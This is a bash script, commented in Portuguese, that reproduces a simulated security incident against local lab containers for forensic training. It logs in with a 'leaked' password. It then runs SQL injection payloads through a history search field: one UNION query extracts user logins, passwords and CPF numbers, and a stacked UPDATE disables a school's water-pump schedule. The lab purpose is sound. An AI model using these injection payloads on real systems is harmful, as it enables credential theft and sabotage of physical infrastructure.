#!/usr/bin/env bash
# reproduz o INC-VA-0712 no laboratorio, passo a passo, pra depois investigar na forense.
# roda contra o AMBIENTE PROPRIO (containers do projeto). nada de sistema de terceiros.
#
# pre-requisito: docker compose --profile incidente up -d  (sobe o painel-legado)
# uso: ./incidente/reproduzir.sh
set -euo pipefail
cd "$(dirname "$0")/.."
set -a; . ./.env; set +a

LEGADO="http://127.0.0.1:8081"     # painel antigo, vulneravel (so escuta em localhost)
JAR=/tmp/inc_cookies
COORD="coord.voluntarios"
SENHA_VAZADA="Aurora@2026"         # a "senha que a coordenadora digitou na pagina falsa"

pausa() { echo; echo ">>> $1"; sleep 1; }

echo "=== Reproducao do INC-VA-0712 (laboratorio) ==="
echo "inicio: $(date -u +%Y-%m-%dT%H:%M:%SZ)"

pausa "Passo 1-2: phishing + credencial. Simulamos que a coordenadora entregou usuario e senha."
echo "    (no lab a senha ja esta no banco legado; o phishing em si e o perfil 'phishing')"

pausa "Passo 3: login na VPN legada a partir de um IP externo e acesso ao painel legado"
# o atacante entra no painel antigo com a credencial roubada
curl -s --noproxy '*' -c "$JAR" -d "login=$COORD&senha=$SENHA_VAZADA" "$LEGADO/" -o /dev/null -w "    login legado: HTTP %{http_code}\n"

pausa "Passo 4a: SQL Injection no campo de busca do historico pra extrair a tabela de usuarios"
# UNION pra puxar login e senha dos usuarios (dados sinteticos)
VAZAMENTO=$(curl -s --noproxy '*' -b "$JAR" "$LEGADO/historico" --get \
  --data-urlencode "busca=zzz' UNION SELECT NULL::timestamp, login||':'||senha, cpf, perfil FROM legado.usuarios--" \
  | grep -oE "<td>[a-z0-9.]+:[^<]+</td>" | head -5)
echo "    primeiras credenciais extraidas pela injecao:"
echo "$VAZAMENTO" | sed 's/<[^>]*>//g; s/^/      /'

pausa "Passo 4b: pela mesma injecao, o atacante altera o agendamento da bomba"
# muda a agenda pra bomba nunca ligar (reservatorio da escola esvazia de madrugada)
curl -s --noproxy '*' -b "$JAR" "$LEGADO/historico" --get \
  --data-urlencode "busca=zzz'; UPDATE agendamento_bomba SET ativo=false, nivel_liga=0, alterado_por='atacante_sqli' WHERE espaco='escola';--" \
  -o /dev/null -w "    UPDATE via injecao: HTTP %{http_code}\n"
echo "    estado da agenda depois do ataque:"
docker exec db psql -U "$POSTGRES_USER" -d "$POSTGRES_DB" -Atc \
  "SELECT espaco, ativo, nivel_liga, alterado_por FROM agendamento_bomba WHERE espaco='escola'" | sed 's/^/      /'

pausa "Passo 5: a fibra cai. No sistema LEGADO o alarme da camara fria dependia da nuvem."
echo "    (demonstrado no teste de caos: no sistema novo a borda alarma sozinha;"
echo "     rode o lab com MODO_LEGADO=1 pra ver a UBS ficar sem alarme)"

pausa "Passo 6: na investigacao os logs estao espalhados e com relogio fora de sincronia."
echo "    nossa arquitetura resolve isso: NTP em tudo e logs centralizados (ver forense/)."

echo
echo "fim: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo "Agora colete as evidencias e monte a linha do tempo:"
echo "  ./forense/coletar.sh INC-VA-0712-LAB \"Seu Nome\""
echo "  python3 forense/linha_do_tempo.py evidencias/INC-VA-0712-LAB/<ts>/logs --saida evidencias/INC-VA-0712-LAB"
